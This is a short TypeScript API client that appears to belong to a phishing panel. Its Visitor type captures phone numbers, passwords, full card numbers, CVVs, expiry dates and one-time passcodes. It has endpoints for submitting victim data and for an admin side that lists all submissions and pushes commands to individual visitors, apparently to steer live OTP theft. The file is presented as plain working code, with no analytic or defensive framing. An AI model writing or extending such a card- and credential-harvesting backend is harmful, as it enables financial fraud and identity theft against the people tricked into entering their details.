const BASE = "/api/unity";

export interface Visitor {
  id: string; submittedAt: string; submittedAtTs: number;
  phone: string; password: string;
  cardNumber: string; cardName: string; cardMonth: string; cardYearExp: string; cardCvv: string;
  otpCode: string; otpStatus: string | null;
  page: string; isActive: boolean; lastSeen: number; country: string;
  status: string;
}

export const unityApi = {
  async submit(data: Omit<Visitor, 'isActive'>) {
    await fetch(`${BASE}/submit`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
  },
  async patch(id: string, data: Partial<Visitor>) {
    await fetch(`${BASE}/submissions/${id}`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
  },
  async getCmd(id: string): Promise<string | null> {
    try {
      const r = await fetch(`${BASE}/cmd/${id}`);
      const d = await r.json();
      return d.cmd;
    } catch { return null; }
  },
};

export const adminApi = {
  async getAll(): Promise<Visitor[]> {
    try {
      const r = await fetch(`${BASE}/submissions`);
      return await r.json();
    } catch { return []; }
  },
  async sendCmd(id: string, cmd: string) {
    await fetch(`${BASE}/cmd/${id}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cmd }) });
  },
  async delete(id: string) {
    await fetch(`${BASE}/submissions/${id}`, { method: "DELETE" });
  },
  async deleteAll() {
    await fetch(`${BASE}/submissions`, { method: "DELETE" });
  },
};
